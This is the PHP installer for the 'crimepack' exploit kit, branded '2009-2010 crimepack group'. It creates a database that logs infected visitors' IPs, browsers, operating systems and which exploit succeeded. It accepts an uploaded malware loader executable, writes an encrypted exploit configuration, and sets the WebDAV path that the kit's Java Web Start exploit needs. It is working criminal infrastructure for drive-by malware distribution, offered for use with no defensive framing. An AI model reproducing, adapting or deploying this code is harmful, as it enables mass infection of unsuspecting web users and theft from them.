<?php


function GoNext($edfcbcad, $fhbcjjhfh) {
	ShowHeaderInstall(  );
	echo '

<table class="main" align="center">
<tr>
<td width="550" valign="top">
<center><img src=img/logo.png>
<hr></center>
<table class="tbl2" width="550"><tr>
<td class="tdtoptable" width="550" align="center"><img src="img/in.png"></td></tr></table>
<table class="tbl1" width="550">
<tr><td align="center" class="td1" width="550"><b>information</b></td>
</tr>
<td align="center" class="tdx1" width="550">
<br>
' . $edfcbcad . '
<br><br>';

	if ($fhbcjjhfh == 1) {
		echo '<a href=javascript:history.go(-1)>go back</a><br><br></td>';
	}
	else {
		echo '
	</td>
	<form action="install.php" method="post" enctype="multipart/form-data">
	<tr><td align="center" class="td1" width="550"><b>loader file</b></td>
	</tr>
	<td align="center" class="tdx1" width="550">
	<br>
	<input type="file" name="loadfile"><br><br>
	<input type="submit" name="finishinstall" value="&nbsp;&nbsp;upload&nbsp;&nbsp;"><br><br>
	</td>
	</form>';
	}

	echo '
<tr>
<td align="center" class="td1" width="550">
<center>(c) 2009-2010 crimepack group - all rights reserved</center>
</td></tr></table></table>
';
}

function ShowHeaderInstall() {
	echo '<html><head>
<title>crimepack install</title>
<style>
body {
background-image:url(\'img/bg.jpg\');
background-repeat:repeat;
	color:#c0c0c0;
 	font: normal 10px "Lucida Sans Unicode",sans-serif;
}
hr { border: 0.5px solid #525252; }
input,select
{
	font-size: 10pt;font-family: Arial;
	color: #666666;
	background-color: #272727;
	border-color:#696969 #696969 #696969 #696969;
	border-width:1pt 1pt 1pt 1pt;
	border-style:solid solid solid solid;
	padding-left: 2pt;
	align: center;
	overflow:hidden; 696969
}
TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif;font-size: 10px; }
.tbl1{

	color: #c0c0c0;

	background-color: #000000;

	border: 1px solid #848383;

}

.td1{
	color: #c0c0c0;
	background-color: #444444;
	border:1px solid #636363;
}
.tdx1{
	background-image:url(\'img/bgdark.jpg\');
	background-repeat:repeat;
	color: #c0c0c0;
	background-color: #272727;

}
.tdtoptable{
	color: #c0c0c0;
	font-weight: bold;
	text-decoration:underline;
	height:20px;
}
a {text-decoration: none; color: #272727; }
a {
	color:#c0c0c0;
	text-decoration:underline;
}
a:hover {
	color:#444444;
	text-decoration:none;
}
.main {
background-image:url(\'img/bgdark.jpg\');
background-repeat:repeat;
	color:#b5b5b5;
	border:1px solid #525252;
}
</style>
</head>
<body>
';
}

set_time_limit( 0 );
ini_set( 'memory_limit', '512M' );
require_once( 'CP-ENC-7531.php' );
require_once( 'CP-ENC-1633.php' );
$configfile = 'config.inc.php';
$webdavfile = 'webdav.php';

if (!file_exists( 'ip-to-country.csv' )) {
	exit( 'Error: ip-to-country.csv is missing' );
}


if (!isset( $_POST['finishinstall'] )) {
	if (( file_exists( $configfile ) || file_exists( $webdavfile ) )) {
		exit( 'Error: remove config.inc.php & webdav.php before installing' );
	}
}


if (file_exists( $configfile )) {
	include( $configfile );
}

$id = 'CP18KYHAK0001';
$idpw = 'password';

if (isset( $_POST['finishinstall'] )) {
	ShowHeaderInstall(  );
	$ok = 0;

	if (is_uploaded_file( $_FILES['loadfile']['tmp_name'] )) {
		move_uploaded_file( $_FILES['loadfile']['tmp_name'], $cpMySQL->DataDecrypt( LOADEXE ) );
		$ok = 1;
	}


	if ($ok) {
		$rep = 'Install successfully completed!<br>Remove install.php';
	}
	else {
		$rep = 'Install failed!';
	}

	echo '
	<table class="main" align="center">
	<tr>
	<td width="550" valign="top">
	<center><img src=img/logo.png>
	<hr></center>
	<table class="tbl2" width="550"><tr>
	<td class="tdtoptable" width="550" align="center"><img src="img/in.png"></td></tr></table>
	<table class="tbl1" width="550">
	<tr><td align="center" class="td1" width="550"><b>information</b></td>
	</tr>
	<td align="center" class="tdx1" width="550">
	<br>
	' . $rep . '
	<br><br>
	</td><tr>
	<td align="center" class="td1" width="550">
	<center>© 2009-2010 crimepack group - all rights reserved -</center>
	</td></tr></table></table>';
	exit(  );
}


if (!isset( $_POST['install'] )) {
	ShowHeaderInstall(  );
	echo '

<form action="install.php" method="post" enctype="multipart/form-data">
<table class="main" align="center">
<tr>
<td width="550" valign="top">
<center><img src=img/logo.png>
<hr></center>
<table class="tbl2" width="550"><tr>
<td class="tdtoptable" width="550" align="center"><img src="img/in.png"></td></tr></table>
<table class="tbl1" width="550">

<!--
	INSTALL PASSWORD
-->

<tr>
<td align="center" class="td1" width="550"><b>install password</b></td></tr>
<td align="center" class="tdx1" width="550">
<br><input type="password" style="text-align:center" name="installpassword" value=""><br><br>
</td>

<!--
	ADMIN SETTINGS
-->

<tr>
<td align="center" class="td1" width="550"><b>admin account</b></td></tr>
<td align="center" class="tdx1" width="550">
login:<br><input type="text" style="text-align:center" name="admlogin" value="admin"><br>
password:<br><input type="password" style="text-align:center" name="admpass" value=""><br><br>
</td>
<tr><td align="center" class="td1" width="550"><b>guest account</b></td></tr>
<td align="center" class="tdx1" width="550">
login:<br><input type="text" style="text-align:center" name="guestlogin" value="guest"><br>
password:<br><input type="password" style="text-align:center" name="guestpass" value=""><br><br>
</td>

<!--
	 MYSQL SETTINGS
-->

<tr><td align="center" class="td1" width="550"><b>mysql settings</b></td></tr>
<td align="center" class="tdx1" width="550">
hostname:
<br><input type="text" style="text-align:center" name="mysqlhost" value="localhost"><br>
user:
<br><input type="text" style="text-align:center" name="mysqluser" value="root"><br>
pass:
<br><input type="text" style="text-align:center" name="mysqlpass" value="abc123"><br>
database:
<br><input type="text" style="text-align:center" name="mysqldb" value="crimepack"><br>
table prefix:
<br><input type="text" style="text-align:center" name="mysqlprefix" value="cpack_"><br>
<br>
</td>

<!--
	WEBDAV SETTINGS
-->

<tr><td align="center" class="td1" width="550"><b>webdav settings</b></td></tr>
<td align="center" class="tdx1" width="550"><br>
debian: webdav directory (2 backslash + domain + backslash + directory + backslash + data.dll)<br>
centos: webdav directory (4 backslash + domain + 2 backslash + directory + 2 backslash + data.dll)<br>
<br><input type="text" style="text-align:center" name="webdav" value="\domain\webdav\data.dll"><br><br>
- if this is incorrect, java webstart exploit will NOT work -
<br><br>
</td>

<!--
	 INFORMATION
-->

<tr><td align="center" class="td1" width="550"><b>information</b></td>
</tr>
<td align="center" class="tdx1" width="550"><br>
it might take a while to install depending on your specs so don\'t panic!<br><br>
<input type="submit" name="install" value="&nbsp;&nbsp;install crimepack&nbsp;&nbsp;"><br><br>
</td>

</form>
<tr>
<td align="center" class="td1" width="550">
<center>© 2009-2010 crimepack group - all rights reserved -</center>
</td></tr></table></table>
</body></html>
';
	return 1;
}

$error = 0;
$rep = '';

if (!isset( $_POST['installpassword'] )) {
	$error = 1;
	$rep .= 'install password is missing<br>';
}


if (!isset( $_POST['admlogin'] )) {
	$error = 1;
	$rep .= 'admin login is missing<br>';
}


if (!isset( $_POST['admpass'] )) {
	$error = 1;
	$rep .= 'admin password is missing<br>';
}


if (!isset( $_POST['guestlogin'] )) {
	$error = 1;
	$rep .= 'guest login is missing<br>';
}


if (!isset( $_POST['guestpass'] )) {
	$error = 1;
	$rep .= 'guest pass is missing<br>';
}


if (!isset( $_POST['mysqlhost'] )) {
	$error = 1;
	$rep .= 'mysql host is missing<br>';
}


if (!isset( $_POST['mysqluser'] )) {
	$error = 1;
	$rep .= 'mysql user is missing<br>';
}


if (!isset( $_POST['mysqlpass'] )) {
	$error = 1;
	$rep .= 'mysql password is missing<br>';
}


if (!isset( $_POST['mysqldb'] )) {
	$error = 1;
	$rep .= 'mysql db is missing<br>';
}


if (!isset( $_POST['mysqlprefix'] )) {
	$error = 1;
	$rep .= 'mysql prefix is missing<br>';
}


if (!isset( $_POST['webdav'] )) {
	$error = 1;
	$rep .= 'webdav path is missing<br>';
}


if (file_exists( $configfile )) {
	$error = 1;
	$rep .= 'remove config.inc.php before installing';
}


if ($_POST['installpassword'] != $idpw) {
	$rep .= 'wrong install password!<br>forgotten?<br>contact author (93887300), your pack id is: ' . $id . ' <br>install failed!';
	$error = 1;
}


if ($error != 1) {
	$fname = $cpFunctions->RandLtr( 8, 2 ) . '.bat';
	$confdata = '<?php
' . '// crimepack configuration for pack id: ' . $id . '
' . 'define(\'MYSQLHOST\',\'' . $cpMySQL->DataEncrypt( $cpMySQL->antisqli( $_POST['mysqlhost'] ) ) . '\');
' . 'define(\'MYSQLUSER\',\'' . $cpMySQL->DataEncrypt( $cpMySQL->antisqli( $_POST['mysqluser'] ) ) . '\');
' . 'define(\'MYSQLPASS\',\'' . $cpMySQL->DataEncrypt( $cpMySQL->antisqli( $_POST['mysqlpass'] ) ) . '\');
' . 'define(\'MYSQLDB\',\'' . $cpMySQL->DataEncrypt( $cpMySQL->antisqli( $_POST['mysqldb'] ) ) . '\');
' . 'define(\'MYSQLPREFIX\',\'' . $cpMySQL->DataEncrypt( $cpMySQL->antisqli( $_POST['mysqlprefix'] ) ) . '\');
' . 'define(\'LOADEXE\',\'' . $cpMySQL->DataEncrypt( $cpMySQL->antisqli( $fname ) ) . '\');
' . 'define(\'DOMAIN\',\'' . $cpMySQL->DataEncrypt( $_SERVER['HTTP_HOST'] ) . '\');
' . 'define(\'AUTOCHECK\',\'' . $cpMySQL->DataEncrypt( '0' ) . '\');
' . 'define(\'REDIRECT\',\'' . $cpMySQL->DataEncrypt( '0' ) . '\');
' . 'define(\'REDIRURL\',\'' . $cpMySQL->DataEncrypt( 'http://www.google.com' ) . '\');
' . 'define(\'BADTRAFF\',\'' . $cpMySQL->DataEncrypt( '0' ) . '\');
' . 'define(\'EXPLOITS\',\'5mjNbGKQRlMEssIrOc4ij4qT3/T/ensAnD/dNi6QKjWLvbde/tO+HQRIKsjce6ROfKpBTSv87mpmUIJykBRYbkdFdZBmRhqrCkXClpdpE7RonzvO4A9rMWqUrN3rv7xE8LfYQs3OYzRn/E3MQWIq0BGQhpcEmxELyj59PesfJTpYnhtU+rvtpJTtHzG6upJaMnRP\');
' . '//end of config
' . '?>';

	if (file_put_contents( $configfile, $confdata ) !== strlen( $confdata )) {
		$error = 1;
		$rep .= 'can\'t write to config file (forgot to chmod?)';
	}

	$webdavdata = '<?php
' . '$webdav = \'' . base64_encode( $_POST['webdav'] ) . '\';
' . '?>';

	if (file_put_contents( $webdavfile, $webdavdata ) !== strlen( $webdavdata )) {
		$error = 1;
		$rep .= 'can\'t write to webdav file (forgot to chmod?)';
	}
}


if ($error != 0) {
	GoNext( $rep, 1 );
	exit(  );
}

include( $configfile );
$error = 0;
$reply = '';
$alogin = $cpMySQL->antisqli( $_POST['admlogin'] );
$apassword = md5( $cpMySQL->antisqli( $_POST['admpass'] ) );
$glogin = $cpMySQL->antisqli( $_POST['guestlogin'] );
$gpassword = md5( $cpMySQL->antisqli( $_POST['guestpass'] ) );

if (!( mysql_connect( $cpMySQL->DataDecrypt( MYSQLHOST ), $cpMySQL->DataDecrypt( MYSQLUSER ), $cpMySQL->DataDecrypt( MYSQLPASS ) ))) {
	exit( 'Unable to connect to mysql, check your settings!' );
	(bool)true;
}


if (mysql_query( 'CREATE DATABASE IF NOT EXISTS ' . $cpMySQL->DataDecrypt( MYSQLDB ) . '' )) {
	mysql_select_db( $cpMySQL->DataDecrypt( MYSQLDB ) );
}
else {
	$reply .= 'Failed to create database<br>';
	$error = 1;
}

$cpUsers = 'CREATE TABLE `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'users` (' . '`id` int(10) unsigned NOT NULL auto_increment,' . '`login` varchar(255) NOT NULL default \'\',' . '`password` varchar(255) NOT NULL default \'\',' . 'PRIMARY KEY  (`id`),' . 'UNIQUE KEY `Login` (`login`),' . 'KEY `id` (`id`)' . ');';

if (!mysql_query( $cpUsers )) {
	$reply .= 'Failed to create users table<br>';
	$error = 1;
}
else {
	$reply .= 'Users table OK<br>';
}

$bInsert = 'INSERT INTO `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . ( '' . 'users` (`id`, `login`, `password`) VALUES (1, \'' . $alogin . '\', \'' . $apassword . '\');' );

if (mysql_query( $bInsert )) {
	$reply .= 'Admin account created!<br>';
}
else {
	$reply .= 'Failed to add admin account!<br>';
	$error = 1;
}

$bInsert = 'INSERT INTO `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . ( '' . 'users` (`id`, `login`, `password`) VALUES (2, \'' . $glogin . '\', \'' . $gpassword . '\');' );

if (mysql_query( $bInsert )) {
	$reply .= 'Guest account created!<br>';
}
else {
	$reply .= 'Failed to add guest account!<br>';
	$error = 1;
}

mysql_query( 'DROP TABLE IF EXISTS `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'peeps`;' );
$cpTablePeeps = 'CREATE TABLE `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'peeps` (
		`id` bigint(20) NOT NULL AUTO_INCREMENT,
		`sploit` varchar(60) DEFAULT NULL,
		`browser` text NOT NULL,
		`os` text NOT NULL,
		`referer` text NOT NULL,
		`ip` text NOT NULL,
		`tstamp` int(30) NOT NULL,
		`country` varchar(20) NOT NULL,
		`version` text NOT NULL,
		`extra` varchar(60) DEFAULT NULL,
		PRIMARY KEY (`id`));';

if (!mysql_query( $cpTablePeeps )) {
	$reply .= 'Failed to create stats table!<br>';
	$error = 1;
}
else {
	$reply .= 'Stats table created!<br>';
}

$cpId = 'CREATE TABLE `' . $cpMySQL->DataDecrypt( MYSQLPREFIX ) . 'expid` (
		`id` bigint(20) NOT NULL AUTO_INCREMENT,
		`exploitid` varchar(60) DEFAULT NULL,
		PRIMARY KEY (`id`));';

if (!mysql_query( $cpId )) {
	$reply .= 'Failed to create Exploit ID table<br>';
	$error = 1;
}
else {
	$reply .= 'Exploit ID Table OK<br>';
}

$bGeo = 'CREATE TABLE IF NOT EXISTS iptoc (' . 'COUNTRY_CODE2 character varying(2),' . 'COUNTRY_CODE3 character varying(3),' . 'COUNTRY_NAME character varying(50),' . 'IP_FROM bigint,' . 'IP_TO bigint' . ');';

if (!mysql_query( $bGeo )) {
	$reply .= 'Unable to create GeoIP table<br>';
	$error = 1;
}

mysql_query( 'DELETE FROM iptoc' );
$csv = 'ip-to-country.csv';
$countrys = file( $csv );

while (list( , $value ) = each( $countrys )) {
	if (preg_match( '/"([0-9]+)","([0-9]+)","(\w+)","(\w+)","(.+)"/', $value, $match )) {
		$result = mysql_query( 'INSERT INTO iptoc (IP_FROM, IP_TO, COUNTRY_CODE2, COUNTRY_CODE3, COUNTRY_NAME) values (' . $match[1] . ',' . $match[2] . ',\'' . $match[3] . '\',\'' . $match[4] . '\',\'' . $match[5] . '\')' );
		continue;
	}
}

GoNext( $reply, $error );
?>
